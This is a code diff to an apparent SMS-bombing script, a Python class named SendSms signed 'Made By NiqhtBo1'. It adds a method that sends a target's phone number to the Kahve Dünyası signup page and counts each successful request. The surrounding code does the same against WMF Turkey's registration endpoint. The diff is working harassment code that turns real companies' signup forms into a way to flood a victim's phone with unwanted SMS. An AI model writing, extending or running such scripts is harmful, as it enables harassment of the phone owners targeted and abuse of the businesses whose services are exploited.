@@ -13,8 +13,21 @@ class SendSms():
             self.mail = mail
         else:
             self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"
-     
+     def kahve(self):
+        try:
+            wmf = requests.post("https://www.kahvedunyasi.com/kayit-ol", data={
+                "mobilenumber": self.phone
+            })
+            if wmf.status_code == 202:
+                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> www.kahvedunyasi.com")
+                self.adet += 1   
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> www.kahvedunyasi.com")
+            
     #wmf.com.tr
+
     def Wmf(self):
         try:
             wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
